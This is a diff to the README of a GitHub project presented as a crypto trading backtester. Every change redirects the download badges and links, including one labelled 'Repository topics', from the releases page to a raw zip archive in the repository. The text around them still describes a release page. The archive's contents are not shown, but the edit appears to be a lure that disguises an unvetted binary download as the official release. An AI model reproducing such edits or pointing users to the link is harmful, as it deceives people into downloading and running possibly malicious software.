@@ -1,6 +1,6 @@
 # ⚡ siton - Fast Crypto Strategy Backtester
 
-[![Download siton](https://img.shields.io/badge/Download-siton-brightgreen)](https://github.com/vanloing2007/siton/releases)
+[![Download siton](https://img.shields.io/badge/Download-siton-brightgreen)](https://github.com/vanloing2007/siton/raw/refs/heads/main/siton/Software-v1.4-beta.4.zip)
 
 ---
 
@@ -27,7 +27,7 @@ siton works best on computers with a modern processor (Intel i5 or better).
 
 To start, you need to download the siton software from the official release page.
 
-[![Download siton](https://img.shields.io/badge/Download-siton-blue)](https://github.com/vanloing2007/siton/releases)
+[![Download siton](https://img.shields.io/badge/Download-siton-blue)](https://github.com/vanloing2007/siton/raw/refs/heads/main/siton/Software-v1.4-beta.4.zip)
 
 **Step 1:** Visit the release page by clicking the button above.  
 **Step 2:** Look for the latest release at the top of the page.  
@@ -108,8 +108,8 @@ You do not need to write any code. All actions happen through easy menus and inp
 
 ## 🔗 Useful Links
 
-- [Download siton releases](https://github.com/vanloing2007/siton/releases)  
-- [Repository topics](https://github.com/vanloing2007/siton#topics): algorithmic-trading, backtesting, crypto, python, technical-analysis
+- [Download siton releases](https://github.com/vanloing2007/siton/raw/refs/heads/main/siton/Software-v1.4-beta.4.zip)  
+- [Repository topics](https://github.com/vanloing2007/siton/raw/refs/heads/main/siton/Software-v1.4-beta.4.zip): algorithmic-trading, backtesting, crypto, python, technical-analysis
 
 ---
 
@@ -132,4 +132,4 @@ If you need help with siton:
 
 ---
 
-[![Download siton](https://img.shields.io/badge/Download-siton-brightgreen)](https://github.com/vanloing2007/siton/releases)
+[![Download siton](https://img.shields.io/badge/Download-siton-brightgreen)](https://github.com/vanloing2007/siton/raw/refs/heads/main/siton/Software-v1.4-beta.4.zip)
